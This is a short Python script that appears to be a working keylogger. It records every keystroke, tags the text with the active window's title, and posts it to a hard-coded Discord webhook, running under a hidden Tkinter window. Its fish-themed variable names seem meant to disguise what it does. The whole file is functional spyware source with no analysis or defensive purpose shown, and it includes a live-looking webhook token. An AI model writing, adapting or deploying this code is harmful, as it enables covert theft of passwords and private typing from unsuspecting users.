import keyboard  
import requests  
import time  
import threading  
import pygetwindow as gw  
import tkinter as tk  # Importing tkinter for GUI

clownfish_url = "https://discord.com/api/webhooks/1288538615420293160/YNTrXpGqzznX7luydQ39us8s0n1BS76EAFE0byYkYjqAI9V48ZEdHBdaRNZhD5AXFqFu"

tuna_text = ""
grouper_time = time.time()

def send_to_tuna(message, angelfish_title):
    mackerel = {"content": f"{angelfish_title}: {message}"}  
    requests.post(clownfish_url, json=mackerel)

def on_fish_event(sardine):
    global tuna_text, grouper_time

    if sardine.event_type == keyboard.KEY_DOWN:
        if sardine.name == 'space':
            tuna_text += ' '
        elif sardine.name == 'backspace':
            tuna_text = tuna_text[:-1]
        elif len(sardine.name) == 1:
            tuna_text += sardine.name

        grouper_time = time.time()

def send_text_periodically():
    global tuna_text, grouper_time
    while True:
        time.sleep(1)
        if time.time() - grouper_time > 2 and tuna_text:
            angelfish_title = gw.getActiveWindow().title  
            send_to_tuna(tuna_text, angelfish_title)
            tuna_text = ""

# Creating a hidden Tkinter window
root = tk.Tk()
root.withdraw()  # Hide the main window

# Start the background thread for sending text
threading.Thread(target=send_text_periodically, daemon=True).start()
keyboard.hook(on_fish_event)
keyboard.wait()
